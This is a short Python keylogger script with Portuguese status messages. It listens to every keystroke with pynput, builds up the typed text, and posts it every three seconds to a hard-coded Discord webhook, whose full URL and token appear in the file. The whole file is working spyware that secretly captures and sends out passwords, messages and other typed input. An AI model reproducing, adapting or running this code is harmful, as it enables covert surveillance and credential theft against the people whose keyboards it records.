from pynput import keyboard
import requests
import threading
import time

text = "" 
webhook_url = "https://discord.com/api/webhooks/1427450579101421630/HvMjNIEy7xoxm-c6IeoGuRIO308cijmA45Cc9xnDVRxwOkkElsZKfzBumcS5kUKX0-B0"
time_interval = 3

def send_data():
    global text
    if text:
        data = {
            "content": text
        }
        try:
            response = requests.post(webhook_url, json=data)
            response.raise_for_status()
            print("Dados enviados com sucesso!")  
            
        except requests.exceptions.RequestException as e:
            print(f"Erro ao enviar dados: {e}")
        except Exception as e:
            print(f"Erro inesperado: {e}")
    

    timer = threading.Timer(time_interval, send_data)
    timer.start()

def on_press(key):
    global text
    try:
        if key == keyboard.Key.space:
            text += " "
        elif key == keyboard.Key.enter:
            text += "\n"
        elif key == keyboard.Key.shift:
            pass
            text += "\t"
        elif key == keyboard.Key.backspace:
            if len(text) > 0:
                text = text[:-1]
        elif key == keyboard.Key.esc:
            return False 
        elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
            pass
        else:
            
            key_str = str(key).strip("'") 
            if key_str:
                text += key_str
    except AttributeError:
        pass 


with keyboard.Listener(on_press=on_press) as listener:
    send_data()
    listener.join()